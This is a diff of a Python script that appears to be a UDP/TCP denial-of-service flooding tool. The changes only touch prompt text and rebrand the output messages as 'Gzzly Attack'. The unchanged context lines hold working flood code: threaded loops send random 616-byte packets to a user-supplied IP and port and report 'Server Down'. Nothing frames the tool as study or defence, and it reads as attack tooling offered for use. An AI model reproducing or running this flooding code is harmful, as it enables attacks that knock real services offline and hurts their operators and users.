@@ -23,11 +23,11 @@ print("\033[31m━━━ Port")
 port = int(input("┗━━━━━━>\033[0m:"))
 time.sleep(1)
 print("\033[31m━━━ Pakets")	
-print("\033[31m━━━ Min Pakets 100")
+print("\033[31m━━━ Mininum Pakets 100")
 times = int(input("┗━━━━━━>\033[0m:"))
 time.sleep(1)
 print("\033[31m━━━ Threads")
-print("\033[31m━━━ Min Threads 100")
+print("\033[31m━━━ Minimum Threads 100")
 threads = int(input("┗━━━━━━>\033[0m:"))
 def xxxx():
   data = random._urandom(616)
@@ -38,7 +38,7 @@ def xxxx():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}=====> UDP BYPASSED ATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[91m}=====> Gzzly Attack To IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       print("[!] Server Down!!!")
 
@@ -51,7 +51,7 @@ def xxx():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[91m}=====> UDP BYPASSED ATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[91m}=====> Gzzly Attack To IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       print("[!] Server Down!!!")
 
@@ -65,7 +65,7 @@ def xx():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[91m}=====> UDP BYPASSED ATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[91m}=====> Gzzly Attack To IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       s.close()
       print("[!] Server Down!!!")
@@ -80,7 +80,7 @@ def x():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[91m}=====> UDP BYPASSED ATTACKING IP PORT \033[0m%s:%s!!!"%(ip,port))
+        print(i +" \033[91m}=====> Gzzly Attack To IP PORT \033[0m%s:%s!!!"%(ip,port))
     except:
       s.close()
       print("[!] Server Down!!!")
